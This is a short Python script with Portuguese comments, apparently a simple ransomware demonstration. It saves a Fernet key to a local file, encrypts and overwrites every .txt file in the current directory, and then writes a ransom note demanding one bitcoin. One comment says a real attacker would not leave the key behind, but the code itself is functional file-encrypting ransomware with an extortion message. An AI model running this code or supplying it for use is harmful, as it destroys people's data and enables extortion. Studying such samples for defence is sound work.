import os
from cryptography.fernet import Fernet

def gerar_chave():
    # Gera a chave e salva num arquivo. Na vida real o atacante nao deixaria isso aq.
    chave = Fernet.generate_key()
    with open("chave.key", "wb") as f:
        f.write(chave)

def criptografar():
    # Le a chave que acabou de ser gerada
    with open("chave.key", "rb") as f:
        chave = f.read()
    
    fernet = Fernet(chave)
    
    # Vai passar por cada arquivo da pasta atual
    for arquivo in os.listdir():
        # So pega os .txt e ignora a nota que a gente vai criar pra nao dar erro
        if arquivo.endswith(".txt") and arquivo != "LEIA_ISSO.txt":
            with open(arquivo, "rb") as f:
                dados = f.read()
            
            # Aqui ele embaralha tudo
            dados_cripto = fernet.encrypt(dados)
            
            # Sobrescreve o arquivo original com o texto criptografado
            with open(arquivo, "wb") as f:
                f.write(dados_cripto)

if __name__ == "__main__":
    gerar_chave()
    criptografar()
    
    # Cria a nota de resgate
    nota = "Seus arquivos foram criptografados. Envie 1 bitcoin pra recuperar."
    with open("LEIA_ISSO.txt", "w") as f:
        f.write(nota)
    
    print("Rodou. Arquivos criptografados.")
